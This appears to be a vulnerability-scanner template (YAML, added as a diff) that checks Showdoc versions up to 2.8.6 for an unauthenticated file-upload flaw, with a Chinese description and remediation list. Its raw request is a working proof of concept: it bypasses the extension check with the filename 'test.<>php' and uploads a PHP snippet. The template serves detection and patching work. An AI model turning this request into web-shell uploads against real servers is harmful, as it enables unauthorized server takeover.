@@ -1,0 +1,39 @@
+id: showdoc-file-upload-rce
+info:
+  name: Showdoc < 2.8.6 File Upload RCE
+  author:
+  - l0ne1y
+  description: |-
+    Showdoc <= 2.8.6 uploadImg 文件上传漏洞
+    Showdoc 是一个开源的在线共享文档工具。
+    Showdoc <= 2.8.6 存在uploadImg 文件上传漏洞，该漏洞源于未正确使用upload方法至文件后缀限制失效，攻击者可在未授权的情况下上传任意文件，进而获取服务器权限等。
+  severity: critical
+  remediation: |-
+    官方修复建议：
+    升级系统至无漏洞版本，或于官网下载安全补丁。
+    https://www.showdoc.com.cn/
+
+    临时修复方案：<br/>文件上传：<br/>1、服务器端将文件上传目录直接设置为不可执行。<br/>2、文件类型检查：建议使用白名单方式（比黑名单更可靠），并结合MIME Type、后缀检查等方式（文件类型做白名单限制）。此外对于图片的处理可以使用压缩函数或resize函数，处理图片的同时破坏其包含的HTML代码。<br/>3、使用随机数改写文件名和文件路径，使得用户不能轻易访问自己上传的文件。<br/>4、单独设置文件服务器的域名。<br/>5、验证文件内容，使用正则匹配恶意代码（过滤恶意代码各种绕过方式，如大小写、BASE64编码）限制上传。<br/>6、修复服务器可能存在的解析漏洞。<br/>7、严格限制可以修改服务器配置的文件上传如：.htaccess。<br/>8、隐藏上传文件路径。<br/>9、升级Web Server。<br/>10、及时修复Web上传代码。<br/>11、不能有本地文件包含漏洞。<br/>12、注意0x00截断攻击（PHP更新到最新版本）。
+requests:
+- matchers:
+  - type: word
+    condition: and
+    words:
+    - '"url":"http:'
+    - '"success":1'
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  raw:
+  - |
+    POST /index.php?s=/home/page/uploadImg HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=--------------------------835846770881083140190633
+
+    ----------------------------835846770881083140190633
+    Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
+    Content-Type: text/plain
+
+    <?php echo {{randstr}};?>
+    ----------------------------835846770881083140190633--
